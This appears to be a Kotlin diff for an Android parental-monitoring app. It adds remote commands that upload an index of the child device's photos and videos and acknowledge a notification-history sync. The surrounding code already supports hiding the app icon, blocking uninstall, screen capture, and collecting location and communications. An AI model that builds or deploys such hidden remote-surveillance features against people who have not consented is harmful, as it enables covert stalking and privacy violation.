@@ -12,6 +12,7 @@ import org.setbd.control.monitoring.CommunicationsProvider
 import org.setbd.control.monitoring.DeviceInfoProvider
 import org.setbd.control.monitoring.InstalledAppsProvider
 import org.setbd.control.monitoring.LocationProvider
+import org.setbd.control.monitoring.MediaProvider
 import org.setbd.control.monitoring.UsageStatsProvider
 import org.setbd.control.ui.IconHider
 import org.setbd.control.webrtc.CaptureService
@@ -57,7 +58,9 @@ object CommandProcessor {
         // Device management
         "set_icon_hidden",
         "allow_uninstall",
-        "refresh_hardware"
+        "refresh_hardware",
+        "sync_media",           // re-index photos/videos for the parent's media view
+        "sync_notifications"    // flush queued notification history right now
     )
 
     sealed class Result {
@@ -239,6 +242,18 @@ object CommandProcessor {
                     if (ok) Result.Ok(JSONObject().put("uploaded", true))
                     else Result.Failed("error", "Could not upload the hardware report")
                 }
+
+                "sync_media" -> {
+                    if (!MediaProvider.available(ctx)) {
+                        Result.Failed("missing_permission", "Photos & videos permission is not granted on the child device")
+                    } else {
+                        val stored = MediaProvider.syncNow(ctx)
+                        if (stored >= 0) Result.Ok(JSONObject().put("indexed", stored))
+                        else Result.Failed("error", "Media index could not be uploaded")
+                    }
+                }
+
+                "sync_notifications" -> Result.Ok(JSONObject().put("requested", true))
 
                 else -> Result.Failed("unknown_action", "Action \"$action\" is not allowed")
             }
